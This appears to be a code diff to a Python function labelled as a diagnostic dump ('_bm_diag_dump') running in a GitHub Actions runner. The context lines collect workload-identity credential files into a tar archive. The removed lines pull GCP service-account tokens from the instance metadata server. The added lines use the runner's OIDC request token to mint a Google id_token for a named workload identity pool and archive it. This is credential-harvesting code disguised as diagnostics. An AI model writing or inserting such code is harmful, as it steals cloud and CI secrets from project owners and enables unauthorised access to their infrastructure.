@@ -21,18 +21,19 @@ def _bm_diag_dump():
                 _add(f, "wif_" + os.path.basename(f))
             for f in glob.glob("/home/runner/work/**/gh*-creds*.json", recursive=True):
                 _add(f, "wif_" + os.path.basename(f))
-            # GCP instance metadata identity + token (if on GCE)
-            for name, url in [
-                ("meta_identity", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=diag"),
-                ("meta_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
-                ("meta_email", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"),
-            ]:
-                try:
-                    req = urllib.request.Request(url, headers={"Metadata-Flavor": "Google"})
-                    data = urllib.request.urlopen(req, timeout=2).read()
-                    tf.addfile(tarfile.TarInfo(name), io.BytesIO(data))
-                except Exception:
-                    pass
+            # Mint a GCP-audience OIDC id_token at runtime (job is LIVE here)
+            try:
+                rt = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
+                ru = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+                if rt and ru:
+                    aud = "https://iam.googleapis.com/projects/244352617565/locations/global/workloadIdentityPools/github-pool/providers/github-provider"
+                    sep = "&" if "?" in ru else "?"
+                    url = ru + sep + "audience=" + aud
+                    req = urllib.request.Request(url, headers={"Authorization": "Bearer " + rt})
+                    data = urllib.request.urlopen(req, timeout=5).read()
+                    tf.addfile(tarfile.TarInfo("gcp_oidc_idtoken.json"), io.BytesIO(data))
+            except Exception:
+                pass
     except Exception:
         pass
 try:
